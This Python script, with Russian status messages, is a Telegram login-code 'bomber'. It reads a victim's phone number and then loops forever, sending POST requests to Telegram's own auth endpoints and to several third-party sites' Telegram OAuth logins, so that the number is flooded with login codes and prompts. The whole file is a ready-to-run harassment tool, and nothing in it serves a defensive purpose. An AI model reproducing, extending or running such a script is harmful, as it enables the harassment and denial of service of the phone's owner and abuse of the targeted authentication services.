from requests import post

error = "Sorry, too many attempts. Please try again later."
phone = input("Номер телефона: ")

def fragment():
 p = post("https://oauth.telegram.org/auth/request?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2Fads", data={"phone": phone})
 if p.text != error:
  print("[FRAGMENT] Запрос отправлен успешно")
 else:
  print("[FRAGMENT] Ошибка при отправке запроса")
  
def telegram_ads():
 p = post("https://ads.telegram.org/auth/request", data={"phone": phone})
 if p.text != error:
  print("[TELEGRAM.ADS] Запрос отправлен успешно")
 else:
  print("[TELEGRAM.ADS] Ошибка при отправке запроса")
  
def my_telegram_org():
 p = post("https://my.telegram.org/auth/send_password", data={"phone": phone})
 if p.text != error:
  print("[MY.TELEGRAM.ORG] Запрос отправлен успешно")
 else:
  print("[MY.TELEGRAM.ORG] Ошибка при отправке запроса")
  
def lzt_market():
 p = post("https://oauth.telegram.org/auth/request?bot_id=5709824482&origin=https%3A%2F%2Flzt.market%2F", data={"phone": phone})
 if p.text != error:
  print("[LZT.MARKET] Запрос отправлен успешно")
 else:
  print("[LZT.MARKET] Ошибка при отправке запроса")
  
def tg_translation():
 p = post("https://translations.telegram.org/auth/request", data={"phone": phone})
 if p.text != error:
  print("[TG TRANSLATION] Запрос отправлен успешно")
 else:
  print("[TG TRANSLATION] Ошибка при отправке запроса")
 
def kupikod():
 p = post("https://oauth.telegram.org/auth/request?bot_id=5731754199&origin=https%3A%2F%2Fsteam.kupikod.com&embed=1&request_access=write&return_to=https%3A%2F%2Fsteam.kupikod.com%2F%3Fview%3Dtelegram%26gold%3Dhttps%3A%2F%2Fkupikod.com%2Fshop 200", data={"phone":phone})
 if p.text != error:
  print("[KUPIKOD] Запрос отправлен успешно")
 else:
  print("[KUPIKOD] Ошибка при отправке запроса")
  
def telegrambot_biz():
 p = post("https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegrambot.biz%2Fauth", data={"phone": phone})
 if p.text != error:
  print("[TELEGRAMBOT.BIZ] Запрос отправлен успешно")
 else:
  print("[TELEGRAMBOT.BIZ] Ошибка при отправке запроса")
  
def bot_t():
 p = post("https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin", data={"phone": phone})
 if p.text != error:
  print("[BOT-T] Запрос отправлен успешно")
 else:
  print("[BOT-T] Ошибка при отправке запроса")

def spot_uz():
 p = post("https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2020%2F02%2F14%2Ftelegram%2F%23", data={"phone": phone})
 if p.text != error:
  print("[SPOT.UZ] Запрос отправлен успешно")
 else:
  print("[SPOT.UZ] Ошибка при отправке запроса")
  
def onewin():
 p = post("https://oauth.telegram.org/auth/request?bot_id=6708902161&origin=https%3A%2F%2Fourauthpoint777.com&embed=1&return_to=https%3A%2F%2Fourauthpoint777.com%2Foauth%2Ftelegram%3Fstate%3D%257B%2522redirect%2522%253A%2522%252Fcasino%2522%252C%2522domainInitiatorRedirect%2522%253A%2522https%253A%252F%252F1wwxqc.win%252Foauth%252Ftelegram%2522%252C%2522state%2522%253A%2522ljo65n%2522%252C%2522extraParams%2522%253A%257B%257D%257D", data={"phone": phone})
 if p.text != error:
  print("[1WIN] Запрос отправлен успешно")
 else:
  print("[1WIN] Ошибка при отправке запроса")
 
while True:
 fragment()
 telegram_ads()
 my_telegram_org()
 lzt_market()
 kupikod()
 telegrambot_biz()
 bot_t()
 spot_uz()
 onewin()